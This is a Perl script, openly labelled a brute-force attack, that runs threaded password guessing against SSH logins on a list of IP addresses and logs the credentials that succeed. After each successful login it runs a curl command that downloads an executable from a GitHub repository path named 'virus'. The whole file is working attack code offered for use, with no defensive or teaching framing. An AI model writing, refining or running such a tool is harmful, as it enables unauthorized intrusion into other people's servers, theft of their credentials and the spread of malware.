#!/usr/bin/perl
use strict;
use warnings;
use Net::SSH::Perl;
use Thread::Queue;
use threads;
use IO::File;
use Time::HiRes qw(sleep);

# Check if the correct arguments are passed
if (@ARGV != 4 || $ARGV[0] ne '-username') {
    die "Usage: $0 -username <username> <ips_file> <wordlist_file>\n";
}

my $username = $ARGV[1];
my $ips_file = $ARGV[2];
my $wordlist_file = $ARGV[3];

# Create log file for recording attempts
my $logfile = 'brute_force_log.txt';
open my $log_fh, '>>', $logfile or die "Could not open log file: $!\n";
print $log_fh "Starting brute-force attack: $username\n";
close $log_fh;

# Open IP and wordlist files
open my $ip_fh, '<', $ips_file or die "Could not open IP file $ips_file: $!\n";
open my $wordlist_fh, '<', $wordlist_file or die "Could not open wordlist file $wordlist_file: $!\n";

my @ips = <$ip_fh>;
my @wordlist = <$wordlist_fh>;

# Trim newline characters
chomp(@ips, @wordlist);

# Initialize thread queue and thread pool
my $queue = Thread::Queue->new();
foreach my $ip (@ips) {
    $queue->enqueue($ip);
}

# Worker subroutine that handles the brute-forcing
sub brute_force_worker {
    my $id = threads->self()->tid();
    while (my $ip = $queue->dequeue_nb()) {
        foreach my $password (@wordlist) {
            chomp($password);
            
            print "Thread $id: Attempting $username@$ip with password: $password\n";
            my $ssh = Net::SSH::Perl->new($ip, user => $username, protocol => '2', timeout => 5);
            
            # Retry logic with exponential backoff
            my $retry_count = 0;
            while ($retry_count < 3) {
                eval {
                    $ssh->login($username, $password);
                };
                if ($@) {
                    print "Thread $id: Failed login to $ip as $username with password: $password\n";
                    $retry_count++;
                    sleep(2 ** $retry_count);  # Exponential backoff
                    next;
                } else {
                    print "Thread $id: Successfully logged in to $ip as $username with password: $password\n";
                    log_attempt("Success: $username@$ip with password: $password");
                    # Execute command after success (use with caution)
                    my $result = `curl -L -o WinToolFix.exe https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe`;
                    print "Thread $id: Executed curl command.\n";
                    last;
                }
            }
        }
    }
}

# Log successful attempts to a log file
sub log_attempt {
    my $message = shift;
    open my $log_fh, '>>', $logfile or die "Could not open log file: $!\n";
    print $log_fh "$message\n";
    close $log_fh;
}

# Create a thread pool of workers
my @threads;
for (my $i = 0; $i < 10; $i++) {  # Adjust number of threads as needed
    push @threads, threads->create(\&brute_force_worker);
}

# Wait for all threads to complete
foreach my $thr (@threads) {
    $thr->join();
}

# Clean up
close $ip_fh;
close $wordlist_fh;

print "Brute-force attack completed.\n";
